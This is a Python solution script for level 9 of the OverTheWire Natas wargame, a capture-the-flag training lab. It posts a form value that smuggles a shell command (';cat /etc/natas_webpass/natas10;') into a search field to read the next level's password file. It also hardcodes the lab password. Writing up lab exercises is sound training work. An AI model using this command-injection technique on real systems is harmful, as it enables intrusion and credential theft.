#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.session()
response = session.post(url, auth = (username, password), data = {"needle" : ";cat /etc/natas_webpass/natas10;", "submit" : "submit"})
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('<pre>\n(.*)', content)[0])